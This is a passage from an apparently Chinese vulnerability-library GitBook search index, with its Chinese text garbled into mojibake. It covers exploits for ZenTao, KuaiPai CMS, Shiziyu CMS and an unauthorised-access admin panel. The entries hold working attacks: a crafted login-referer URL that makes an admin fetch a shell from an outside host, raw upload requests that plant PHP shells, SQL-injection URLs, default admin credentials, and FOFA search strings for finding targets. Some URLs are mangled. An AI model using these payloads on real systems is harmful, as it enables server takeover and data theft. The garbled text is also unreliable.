Á¶ÖÈÅìÂÆòÊñπÁΩëÁ´ô Ë∞ÉÁî®Êé•Âè£Êü•ËØ¢ÁâàÊú¨‰ø°ÊÅØ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáåÂà©Áî® Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325(ÂèØÂèÇÁÖß‰∏ä‰∏ÄÁØáÊñáÁ´†) Êù•ÊûÑÈÄ†‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑURLÂú∞ÂùÄ Êü•Áúãmodule/common/model.phpÁöÑcheckPrivÊñπÊ≥ï public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } ËøôÈáåÁöÑ‰ª£Á†ÅÁâáÊÆµ‰∏∫Èâ¥ÊùÉÂáΩÊï∞ÔºåÂèØ‰ª•ÁúãÂà∞ÊúÄÂêé‰∏ÄÂè•‰ª£Á†Å $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); ÊâÄ‰ª•ÂΩìË∞ÉÁî®ÂΩìÂâçÊùÉÈôê‰∏çÂÖÅËÆ∏ÁöÑÊñπÊ≥ïÊó∂Ôºå‰ºöËøõË°åË∑≥ËΩ¨ÔºåÂπ∂Âú®$refererÂèÇÊï∞ÁºìÂ≠òË∞ÉÁî®ÁöÑÊñπÊ≥ïURLÔºåÂΩì‰ΩøÁî®Ëøô‰∏™Ë∑≥ËΩ¨ÁöÑÂú∞ÂùÄÁôªÂΩïÊó∂Âàô‰ºöÁõ¥Êé•Ë∞ÉÁî®Ê≠§ÊñπÊ≥ï URLÂú∞ÂùÄÊûÑÈÄ†ËøáÁ®ã http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php Â∞ÜlinkÂèÇÊï∞base64Âä†ÂØÜ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw Â∞ÜrefererÂèÇÊï∞‰ª• . ÂÅöÂàÜÂâ≤base64Âä†ÂØÜ‰∏§ËæπÂ≠óÁ¨¶ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= Â∞ÜËøô‰∏™URLÂú∞ÂùÄÂèëÈÄÅÁªôÁÆ°ÁêÜÂëòÔºåÂΩìÁÆ°ÁêÜÂëòÁôªÂΩïÊó∂Âàô‰ºöËß¶ÂèëÊÅ∂ÊÑèÊñá‰ª∂‰∏ãËΩΩ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/":{"url":"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/","title":"Âø´ÊéíCMS","keywords":"","body":"Âø´ÊéíCMS Âø´ÊéíCMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Âø´ÊéíCMS ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Âø´ÊéíCMS ÂêéÂè∞XSSÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Âø´ÊéíCMS ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Âø´ÊéíCMS ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Âø´ÊéíCMS ÈªòËÆ§ÂºÄÂêØÊó•ÂøóËÆ∞ÂΩïÔºåÁî±‰∫éÊó•ÂøóÂêç‰∏∫Êó∂Èó¥‰Ωú‰∏∫Êñá‰ª∂ÂêçÔºåÈÄ†ÊàêÁÆ°ÁêÜÂëòÁöÑCookieÊ≥ÑÈú≤ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Âø´Êéí CMS ÁéØÂ¢ÉÊê≠Âª∫ https://gitee.com/qingzhanwang/kpcms ÊºèÊ¥ûÂ§çÁé∞ Êñá‰ª∂ thinkphp/library/think/log/driver/Socket.php ËøôÈáåÈªòËÆ§ÂºÄÂêØÊó•ÂøóÂÜôÂÖ• runtime/log/202104/06.log ÂÖ∂‰∏≠ÂèØ‰ª•ÁúãÂà∞Ê≥ÑÈú≤‰∫ÜÁÆ°ÁêÜÂëòÁöÑCookie‰ø°ÊÅØÂíåÂÖ∂‰ªñÊïèÊÑü‰ø°ÊÅØ Âπ∂‰∏îÊñá‰ª∂ÂëΩÂêç‰∏∫ Âπ¥+Êúà/Êó•Êúü.log ËøôÈáåÂÖ≥Ê≥®ÂêéÂè∞ÁöÑÊó•ÂøóÊñá‰ª∂‰∏≠ÁöÑ admin.phpÈ°µÈù¢ÁöÑcookieÂ∞±ÂèØ‰ª•Ëé∑ÂæóÁÆ°ÁêÜÂëòÊùÉÈôê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ÂêéÂè∞XSSÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ÂêéÂè∞XSSÊºèÊ¥û.html","title":"Âø´ÊéíCMS ÂêéÂè∞XSSÊºèÊ¥û","keywords":"","body":"Âø´ÊéíCMS ÂêéÂè∞XSSÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Âø´ÊéíCMS ÂêéÂè∞Â≠òÂú®XSSÊºèÊ¥ûÔºåÈÄöËøáÂêéÂè∞ÊûÑÈÄ†ÁâπÊÆäËØ≠Âè•ÂèØ‰ª•ÈÄ†ÊàêËÆøÈóÆÁΩëÁ´ôÁöÑÁî®Êà∑Ë¢´XSSÂΩ±Âìç ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Âø´Êéí CMS ÁéØÂ¢ÉÊê≠Âª∫ https://gitee.com/qingzhanwang/kpcms ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂá∫Áé∞Âú®ÁôªÂΩïÂêéÂè∞ÁöÑÁΩëÁ´ôÁºñËæëÁöÑ‰ΩçÁΩÆÔºåÁî±‰∫éÊ≤°ÊúâÂØπËæìÂá∫ÁöÑÂ≠óÁ¨¶ËøõË°åËøáÊª§ÔºåÂØºËá¥XSS ‰∏ªÈ°µÁâàÊùÉÂ§ÑÂµåÂÖ•XSS‰ª£Á†Å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Âø´ÊéíCMS/Âø´ÊéíCMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"Âø´ÊéíCMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"Âø´ÊéíCMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Âø´ÊéíCMS ÂêéÂè∞ÁÆ°ÁêÜÊ®°ÂùóÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Âø´Êéí CMS ÁéØÂ¢ÉÊê≠Âª∫ https://gitee.com/qingzhanwang/kpcms ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã, ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫ admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html Ê∫êÁ†Å‰∏≠Ê≤°ÊúâÂØπ‰∏ä‰º†Êñá‰ª∂ÁöÑÂêéÁºÄÊ£ÄÊµã thinkphp/library/think/File.php ‰ªªÊÑèÊâæ‰∏ÄÂ§ÑÊñá‰ª∂‰∏ä‰º†ÁÇπ ‰∏ä‰º†ÊäìÂåÖËé∑ÂèñÊñá‰ª∂Âú∞ÂùÄ POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- ËøûÊé•ÂÜ∞ËùéÊú®È©¨Âç≥ÂèØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/":{"url":"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/","title":"ÁãÆÂ≠êÈ±ºCMS","keywords":"","body":"ÁãÆÂ≠êÈ±ºCMS ÁãÆÂ≠êÈ±ºCMS wxapp.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÁãÆÂ≠êÈ±ºCMS image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÁãÆÂ≠êÈ±ºCMS ApigoodController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û ÁãÆÂ≠êÈ±ºCMS ApiController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS wxapp.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS wxapp.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"ÁãÆÂ≠êÈ±ºCMS wxapp.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"ÁãÆÂ≠êÈ±ºCMS wxapp.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÁãÆÂ≠êÈ±ºCMS wxapp.phpÊñá‰ª∂ Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂú®Ê≤°ÊúâË∫´‰ªΩÈ™åËØÅÁöÑÊÉÖÂÜµ‰∏ãÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÁãÆÂ≠êÈ±ºCMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ‰∏ä‰º†PHPÊñá‰ª∂ POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: Content-Length: 210 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs-- Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"ÁãÆÂ≠êÈ±ºCMS image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"ÁãÆÂ≠êÈ±ºCMS image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÊèèËø∞ ÁãÆÂ≠êÈ±ºCMS‰ΩøÁî®CKÁºñËæëÂô®ÔºåÂ≠òÂú®ÂõæÁâá‰∏ä‰º†ÁöÑÁªïËøáÔºåÈÄ†Êàê image_upload.php ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÁãÆÂ≠êÈ±ºCMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûÊñá‰ª∂‰∏∫ CKÁºñËæëÂô®ÁöÑ image_upload.php $max_size) { // Âà§Êñ≠Êñá‰ª∂Â§ßÂ∞èÊòØÂê¶Â§ß‰∫é500000Â≠óËäÇ echo '{\"result\":\"400\",\"msg\":\"‰∏ä‰º†ÂõæÁâáÂ§™Â§ßÔºåÊúÄÂ§ßÊîØÊåÅÔºö'.($max_size/1024).'KB\"}'; exit (); } if (! in_array ( $file ['type'], $arrType )) { // Âà§Êñ≠ÂõæÁâáÊñá‰ª∂ÁöÑÊ†ºÂºè echo '{\"result\":\"400\",\"msg\":\"‰∏ä‰º†ÂõæÁâáÊ†ºÂºè‰∏çÂØπ\"}'; exit (); } if (! file_exists ( $upfile )) { // Âà§Êñ≠Â≠òÊîæÊñá‰ª∂ÁõÆÂΩïÊòØÂê¶Â≠òÂú® mkdir ( $upfile, 0777, true ); } $imageSize = getimagesize ( $file ['tmp_name'] ); $img = $imageSize [0] . '*' . $imageSize [1]; $fname = $file ['name']; $ftype = explode ( '.', $fname ); $time = explode ( \" \", microtime () ); $time = $time [1] . ($time [0] * 1000); $time2 = explode ( \".\", $time ); $time = $time2 [0]; $returnName=$time.\".\" .end($ftype); $picName = $upfile . \"/\" . $returnName ; if (! move_uploaded_file ( $file ['tmp_name'], $picName )) { echo '{\"result\":\"400\",\"msg\":\"‰ªé:'.$file ['tmp_name'].'ÁßªÂä®ÂõæÁâáÂà∞:'.$picName.'Âá∫Èîô\"}'; exit (); } else { echo '{\"result\":\"200\",\"imgurl\":\"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/' . $returnName . '\"}'; } } ?> ÂÖ∂‰∏≠‰ΩøÁî® Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif Âç≥ÂèØÁªïËøá‰∏ä‰º†PHPÊñá‰ª∂ POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2 Host: Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs Content-Length: 208 ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"files\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs‚Äî ËÆøÈóÆËøîÂõûÁöÑÊñá‰ª∂Ë∑ØÂæÑ /Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS ApigoodController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS ApigoodController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÁãÆÂ≠êÈ±ºCMS ApigoodController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÁãÆÂ≠êÈ±ºCMS ApigoodsController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÁãÆÂ≠êÈ±ºCMS ApiController.class.php ÂèÇÊï∞ËøáÊª§Â≠òÂú®‰∏ç‰∏•Ë∞®ÔºåÂØºËá¥SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÁãÆÂ≠êÈ±ºCMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ ApigoodsController.class.php , ÂÖ≥ÈîÆ‰ΩçÁΩÆ‰∏∫ public function get_goods_detail() { $id = I('get.id'); $pin_id = I('get.pin_id', 0); $token = I('get.token'); $weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find(); $member_id = $weprogram_token['member_id']; $need_data = array(); $sql = \"select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video, gd.summary,gd.share_title,gd.activity_summary,gd.tag from \" . C('DB_PREFIX') . \"goods g,\" . C('DB_PREFIX') . \"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\" . $id; $goods = M()->query($sql); $pin_model = D('Home/Pin'); $goods_model = D('Home/Goods'); $qian = array( \"/Uploads/image\" ); $c_site_url = str_replace('/dan','',C('SITE_URL')); $hou = array( $c_site_url . \"/Uploads/image\" ); $goods[0]['video_src'] = C('SITE_URL').\"Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/\".$goods[0]['video_src']; $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']); $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']); $qian = array( \"\\r\\n\" ); ÊºèÊ¥ûÊµãËØï‰∏∫ https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS ApiController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ÁãÆÂ≠êÈ±ºCMS/ÁãÆÂ≠êÈ±ºCMS ApiController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÁãÆÂ≠êÈ±ºCMS ApiController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÁãÆÂ≠êÈ±ºCMS ApiController.class.php SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÁãÆÂ≠êÈ±ºCMS ApiController.class.php ÂèÇÊï∞ËøáÊª§Â≠òÂú®‰∏ç‰∏•Ë∞®ÔºåÂØºËá¥SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÁãÆÂ≠êÈ±ºCMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ ApiController.class.php , ÂÖ≥ÈîÆ‰ΩçÁΩÆ‰∏∫ public function goods_detail() { $goods_id = I('get.goods_id'); //gallery =>img_url //goods goods.goods_desc goods_name group_price market_price sell_count group_number $sql=\"select g.*,gd.description,gd.summary,gd.tag from \". C('DB_PREFIX').\"goods g,\".C('DB_PREFIX').\"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\".$goods_id; $goods_arr=M()->query($sql); $qian=array(\"\\r\\n\"); $hou=array(\"\"); $goods_arr[0]['summary'] = str_replace($qian,$hou,$goods_arr[0]['summary']); $sql=\"select image from \".C('DB_PREFIX').\"goods_image where goods_id=\".$goods_id; $goods_image=M()->query($sql); $gallery = array(); $default_image = ''; foreach($goods_image as $val) { $val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/ http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/'.$val['image']; if(empty($default_image)) { $default_image = str_replace('http','https',C('SITE_URL')).resize($val['image'], C('goods_thumb_width'), C('goods_thumb_height')); } $gallery[] = array('img_url' => $val['img_url']); } $goods = $goods_arr[0]; ÊºèÊ¥ûÊµãËØï‰∏∫ https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂéüÂàõÂÖàÈîã/":{"url":"book/CMSÊºèÊ¥û/ÂéüÂàõÂÖàÈîã/","title":"ÂéüÂàõÂÖàÈîã","keywords":"","body":"ÂéüÂàõÂÖàÈîã ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂéüÂàõÂÖàÈîã/ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ÂéüÂàõÂÖàÈîã/ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ Â≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•‰ªªÊÑèÊé•ÁÆ°Ë¥¶Êà∑ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂéüÂàõÂÖàÈîã ÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞ FOFA [!NOTE] body=\"https://www.bjycxf.com\" ÊºèÊ¥ûÂ§çÁé∞ ÂêéÂè∞ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã Êú™ÊéàÊùÉÁöÑUrl /admin/admin/admin_list.html ÁÇπÂáªÊ∑ªÂä†Âπ∂ÊéàÊùÉÂç≥ÂèØËé∑ÂèñÂêéÂè∞Ê®°ÂùóÊùÉÈôê ÂèÇËÄÉÊñáÁ´† http://www.0dayhack.net/index.php/1693/ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/","title":"Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û","keywords":"","body":"Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥ûüê∫ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/","title":"Windows","keywords":"","body":"Windows Windows CryptoAPIÊ¨∫È™óÊºèÊ¥û CVE-2020-0601 Windows SMBËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û 